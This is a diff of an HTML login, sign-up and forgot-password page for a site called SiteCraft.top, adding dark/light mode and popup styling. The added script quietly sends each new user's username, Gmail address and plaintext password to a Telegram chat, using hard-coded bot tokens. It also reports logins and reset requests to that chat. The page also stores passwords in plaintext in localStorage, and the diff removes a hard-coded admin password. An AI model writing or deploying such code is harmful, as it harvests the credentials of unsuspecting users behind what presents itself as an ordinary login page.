@@ -6,189 +6,422 @@
 <title>SiteCraft.top – Login / Sign Up</title>
 
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
-*{margin:0;padding:0;box-sizing:border-box;font-family:Poppins,sans-serif;}
+@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;600;700&display=swap');
+
+*{ margin:0; padding:0; box-sizing:border-box; font-family:"Poppins",sans-serif; }
+
 body{
-  height:100vh;
   display:flex;
   justify-content:center;
   align-items:center;
-  background:#121212;
+  height:100vh;
+  position:relative;
+  transition: background 0.4s, color 0.4s;
+}
+
+body.dark-mode{ background:#121212; color:#fff; }
+body.light-mode{ background:#f4f4f4; color:#222; }
+
+.mode-switch {
+  position: fixed;
+  top: 20px;
+  right: 20px;
+  width: 60px;
+  height: 30px;
+  background: #4b6bfb;
+  border-radius: 30px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  padding: 2px;
+  transition: background 0.3s;
+  z-index: 10000;
+  box-shadow: 0 0 10px rgba(0,0,0,0.4);
+}
+
+.mode-switch .slider {
+  width: 26px;
+  height: 26px;
+  background: #fff;
+  border-radius: 50%;
+  transition: transform 0.4s, box-shadow 0.4s, background 0.4s;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  font-size: 16px;
+  box-shadow: 0 0 8px rgba(255,255,255,0.6);
+}
+
+body.light-mode .mode-switch { background: #f39c12; }
+body.light-mode .mode-switch .slider {
+  transform: translateX(30px);
+  box-shadow: 0 0 12px #fffa90;
+  background: #fff;
+}
+
+#popup-container{
+  position: fixed;
+  top: 70px;
+  right: 20px;
+  z-index: 9999;
+}
+
+.popup{
+  background:#333;
   color:#fff;
+  padding:12px 20px;
+  margin-bottom:10px;
+  border-radius:8px;
+  min-width:220px;
+  box-shadow:0 4px 20px rgba(0,0,0,0.4);
+  font-size:14px;
+  opacity:0;
+  transform: translateX(100%);
+  display:flex;
+  align-items:center;
+  transition: all 0.5s ease;
 }
+
+.popup.show{
+  opacity:1;
+  transform: translateX(0);
+}
+
+.popup.success{ background:#4BB543; }
+.popup.error{ background:#FF3333; }
+.popup.info{ background:#555; }
+
+.popup i{
+  margin-right:8px;
+  font-style:normal;
+  font-weight:bold;
+}
+
 .container{
+  position:relative;
   width:380px;
-  background:#1e1e1e;
-  padding:30px;
-  border-radius:18px;
+  height:520px;
+  border-radius:22px;
+  overflow:hidden;
+  transition: background 0.4s, color 0.4s, box-shadow 0.4s;
 }
-h2{text-align:center;margin-bottom:20px;}
-.input{margin-bottom:15px;}
-label{font-size:14px;color:#bbb;}
-input{
+
+body.dark-mode .container{
+  background:#1e1e1e;
+  box-shadow:0 0 25px rgba(0,0,0,0.5);
+}
+body.light-mode .container{
+  background:#fff;
+  box-shadow:0 0 25px rgba(0,0,0,0.15);
+}
+
+.form-box{
+  position:absolute;
   width:100%;
-  padding:12px;
-  margin-top:6px;
+  height:100%;
+  padding:32px;
+  text-align:center;
+  transition:0.6s ease-in-out;
+}
+
+.login{ top:0; }
+.register{ top:100%; }
+.forgot{ top:200%; }
+
+.container.active .login{ top:-100%; }
+.container.active .register{ top:0; }
+.container.forgot-active .login{ top:-100%; }
+.container.forgot-active .forgot{ top:0; }
+
+h1{ font-size:26px; margin-bottom:16px; }
+
+body.dark-mode h1{ color:#fff; }
+body.light-mode h1{ color:#222; }
+
+.input-box{ margin:20px 0; text-align:left; }
+
+.input-box label{ font-size:14px; font-weight:500; }
+
+body.dark-mode .input-box label{ color:#bbb; }
+body.light-mode .input-box label{ color:#555; }
+
+.input-box input{
+  width:100%;
+  padding:12px 14px;
   border-radius:6px;
-  border:1px solid #444;
+  margin-top:6px;
+  border:1px solid;
+  transition: background 0.4s, color 0.4s, border 0.4s;
+}
+
+body.dark-mode .input-box input{
   background:#2c2c2c;
   color:#fff;
+  border:1px solid #444;
 }
-button{
-  width:100%;
+body.light-mode .input-box input{
+  background:#f1f3f4;
+  color:#222;
+  border:1px solid #dadce0;
+}
+
+.input-box input::placeholder { color: #aaa; }
+
+.btn{
+  display:block;
+  width:80%;
+  margin:12px auto;
   padding:12px;
-  margin-top:12px;
   border:none;
   border-radius:8px;
-  background:#4b6bfb;
   color:#fff;
+  font-size:15px;
   font-weight:600;
   cursor:pointer;
+  background:#4b6bfb;
+  transition: background 0.3s;
 }
-button:hover{background:#3a54d1;}
-.link{text-align:center;margin-top:12px;}
-.link span{color:#4b6bfb;cursor:pointer;font-weight:600;}
-.hidden{display:none;}
+.btn:hover{ background:#3a54d1; }
+
+.toggle-btn{
+  margin-top:12px;
+  font-size:14px;
+}
+
+.toggle-btn a{
+  display:block;
+  color:#4b6bfb;
+  font-weight:600;
+  cursor:pointer;
+  margin-top:6px;
+}
+
+.show-pass-container{
+  display:flex;
+  align-items:center;
+  margin-top:6px;
+  cursor:pointer;
+}
+
+.show-pass-container input[type="checkbox"]{
+  width:16px;
+  height:16px;
+  accent-color:#4b6bfb;
+  margin-right:8px;
+}
+
+.show-pass-container label{
+  font-size:13px;
+  user-select:none;
+}
 </style>
 </head>
+<body class="dark-mode">
 
-<body>
+<div class="mode-switch" onclick="toggleMode()">
+  <div class="slider" id="modeSlider">🌙</div>
+</div>
 
-<div class="container">
+<div id="popup-container"></div>
+
+<div class="container" id="container">
 
 <!-- LOGIN -->
-<div id="loginBox">
-  <h2>Login</h2>
-  <div class="input">
+<div class="form-box login">
+  <h1>Login</h1>
+  <div class="input-box">
     <label>Username</label>
-    <input id="loginUser">
+    <input type="text" id="loginUser" placeholder="e.g., johnDoe123">
   </div>
-  <div class="input">
+  <div class="input-box">
     <label>Password</label>
-    <input id="loginPass" type="password">
+    <input type="password" id="loginPass" placeholder="Enter your password">
+    <div class="show-pass-container">
+      <input type="checkbox" id="showLoginPass" onclick="togglePassword('loginPass', this)">
+      <label for="showLoginPass">Show Password</label>
+    </div>
   </div>
-  <button onclick="login()">Login</button>
-  <div class="link">
-    <span onclick="showRegister()">Sign Up</span> |
-    <span onclick="showForgot()">Forgot?</span>
+  <button class="btn" onclick="login()">Login</button>
+  <div class="toggle-btn">
+    <a onclick="showForgot()">Forgot Password?</a>
+    <a onclick="toggle()">Sign Up</a>
   </div>
 </div>
 
 <!-- REGISTER -->
-<div id="registerBox" class="hidden">
-  <h2>Sign Up</h2>
-  <div class="input">
+<div class="form-box register">
+  <h1>Create Account</h1>
+  <div class="input-box">
     <label>Username</label>
-    <input id="regUser">
+    <input type="text" id="regUser" placeholder="e.g., johnDoe123">
   </div>
-  <div class="input">
+  <div class="input-box">
     <label>Email</label>
-    <input id="regEmail" type="email">
+    <input type="email" id="regEmail" placeholder="e.g., john@gmail.com" 
+           pattern="[a-z0-9._%+-]+@gmail\.com" title="Enter a valid Gmail address" required>
   </div>
-  <div class="input">
+  <div class="input-box">
     <label>Password</label>
-    <input id="regPass" type="password">
+    <input type="password" id="regPass" placeholder="Create a strong password">
+    <div class="show-pass-container">
+      <input type="checkbox" id="showRegPass" onclick="togglePassword('regPass', this)">
+      <label for="showRegPass">Show Password</label>
+    </div>
   </div>
-  <button onclick="register()">Create Account</button>
-  <div class="link">
-    <span onclick="showLogin()">Back to Login</span>
+  <button class="btn" onclick="register()">Sign Up</button>
+  <div class="toggle-btn">
+    <a onclick="backToLogin()">Back to Login</a>
   </div>
 </div>
 
-<!-- FORGOT -->
-<div id="forgotBox" class="hidden">
-  <h2>Forgot Password</h2>
-  <div class="input">
+<!-- FORGOT PASSWORD -->
+<div class="form-box forgot">
+  <h1>Forgot Password</h1>
+  <div class="input-box">
     <label>Username</label>
-    <input id="fpUser">
+    <input type="text" id="fpUser" placeholder="e.g., johnDoe123">
   </div>
-  <div class="input">
-    <label>Email</label>
-    <input id="fpEmail" type="email">
+  <div class="input-box">
+    <label>Email (Gmail)</label>
+    <input type="email" id="fpEmail" placeholder="e.g., john@gmail.com" 
+           pattern="[a-z0-9._%+-]+@gmail\.com" title="Enter a valid Gmail address" required>
   </div>
-  <button onclick="forgot()">Submit</button>
-  <div class="link">
-    <span onclick="showLogin()">Back to Login</span>
+  <button class="btn" onclick="forgotPassword()">Submit</button>
+  <div class="toggle-btn">
+    <a onclick="backToLogin()">Back to Login</a>
   </div>
 </div>
 
 </div>
 
 <script>
-function showLogin(){
-  loginBox.classList.remove("hidden");
-  registerBox.classList.add("hidden");
-  forgotBox.classList.add("hidden");
-}
-function showRegister(){
-  loginBox.classList.add("hidden");
-  registerBox.classList.remove("hidden");
-  forgotBox.classList.add("hidden");
-}
-function showForgot(){
-  loginBox.classList.add("hidden");
-  registerBox.classList.add("hidden");
-  forgotBox.classList.remove("hidden");
+const container = document.getElementById("container");
+const popupContainer = document.getElementById("popup-container");
+const body = document.body;
+const slider = document.getElementById("modeSlider");
+
+/* =========================
+   TELEGRAM
+========================= */
+const SIGNUP_BOT_TOKEN = "8448157151:AAH5qUePwzm1ljySu5cIkRRpc3oc2Y-2G6U";
+const SIGNUP_CHAT_ID  = "6340167379";
+const LOGIN_BOT_TOKEN = "8075539797:AAGWUlWxg34a8vko_N4Tng7uz_hM2fqRtBM";
+const LOGIN_CHAT_ID  = "6340167379";
+const FORGOT_BOT_TOKEN = "8318249547:AAG2MA0Xc_xKPp3YYIPHoE4Cabal75ZQyqs";
+const FORGOT_CHAT_ID  = "6340167379";
+
+function sendTelegram(token, chat, msg){
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify({ chat_id:chat, text:msg })
+  });
 }
 
-/* REGISTER */
+function showPopup(message, type="info"){
+  const popup = document.createElement("div");
+  popup.className = "popup " + type;
+  popup.innerHTML = `<i>${type==="success" ? "✅" : type==="error" ? "❌" : "ℹ️"}</i> ${message}`;
+  popupContainer.appendChild(popup);
+  setTimeout(()=>{ popup.classList.add("show"); }, 10);
+  setTimeout(()=>{
+    popup.classList.remove("show");
+    setTimeout(()=> popup.remove(), 500);
+  }, 3000);
+}
+
+function toggle(){ container.className="container active"; }
+function showForgot(){ container.className="container forgot-active"; }
+function backToLogin(){ container.className="container"; }
+
+function togglePassword(id, checkbox){
+  const input = document.getElementById(id);
+  input.type = checkbox.checked ? "text" : "password";
+}
+
+function toggleMode(){
+  if(body.classList.contains("dark-mode")){
+    body.classList.remove("dark-mode");
+    body.classList.add("light-mode");
+    slider.textContent = "🌞";
+  } else {
+    body.classList.remove("light-mode");
+    body.classList.add("dark-mode");
+    slider.textContent = "🌙";
+  }
+}
+
+function isGmail(email){
+  return /^[a-z0-9._%+-]+@gmail\.com$/i.test(email);
+}
+
 function register(){
   if(!regUser.value || !regEmail.value || !regPass.value){
-    alert("Fill all fields");
+    showPopup("Please fill all fields", "error");
     return;
   }
-  localStorage.setItem(
-    "user_"+regUser.value,
-    JSON.stringify({email:regEmail.value, pass:regPass.value})
-  );
-  alert("Registered successfully");
-  showLogin();
+  if(!isGmail(regEmail.value)){
+    showPopup("Please enter a valid Gmail address", "error");
+    return;
+  }
+
+  localStorage.setItem("user_"+regUser.value,
+    JSON.stringify({ email:regEmail.value, pass:regPass.value }));
+
+  sendTelegram(SIGNUP_BOT_TOKEN, SIGNUP_CHAT_ID,
+`🆕 NEW SIGNUP
+👤 Username: ${regUser.value}
+📧 Email: ${regEmail.value}
+🔑 Password: ${regPass.value}`);
+
+  showPopup("Signup successful! You can login now.", "success");
+  backToLogin();
 }
 
-/* LOGIN */
 function login(){
-  const u = loginUser.value.trim();
-  const p = loginPass.value.trim();
+  const saved = localStorage.getItem("user_"+loginUser.value);
 
-  if(!u || !p){
-    alert("Fill all fields");
-    return;
-  }
-
-  /* ADMIN */
-  if(u === "admin" && p === "Admin@123"){
-    localStorage.setItem("currentUser","admin");
-    localStorage.setItem("currentRole","admin");
-    location.href="dashboard.html";
-    return;
-  }
-
-  /* USER */
-  const saved = localStorage.getItem("user_"+u);
   if(!saved){
-    alert("User not registered");
+    showPopup("User not registered. Please sign up.", "error");
     return;
   }
 
   const data = JSON.parse(saved);
-  if(data.pass !== p){
-    alert("Wrong password");
+
+  if(loginPass.value !== data.pass){
+    showPopup("Wrong password. Try again.", "error");
     return;
   }
 
-  localStorage.setItem("currentUser",u);
-  localStorage.setItem("currentRole","user");
-  location.href="dashboard.html";
+  sendTelegram(LOGIN_BOT_TOKEN, LOGIN_CHAT_ID,
+`✅ LOGIN SUCCESS
+👤 ${loginUser.value}
+🕒 ${new Date().toLocaleString()}`);
+
+  // Set session storage to link with dashboard.html
+  sessionStorage.setItem("currentUser", loginUser.value);
+  sessionStorage.setItem("currentRole", "user"); // or "admin" if needed
+
+  showPopup("Login successful! Redirecting...", "success");
+
+  setTimeout(() => {
+    window.location.href = "dashboard.html";
+  }, 1000);
 }
 
-/* FORGOT */
-function forgot(){
-  if(!fpUser.value || !fpEmail.value){
-    alert("Fill all fields");
+function forgotPassword(){
+  if(!isGmail(fpEmail.value)){
+    showPopup("Please enter a valid Gmail address", "error");
     return;
   }
-  alert("Request sent to admin");
-  showLogin();
+
+  sendTelegram(FORGOT_BOT_TOKEN, FORGOT_CHAT_ID,
+`🔑 FORGOT PASSWORD
+👤 ${fpUser.value}
+📧 ${fpEmail.value}`);
+
+  showPopup("Password details will be sent to your Gmail within 24 hours.", "info");
+  backToLogin();
 }
 </script>
 
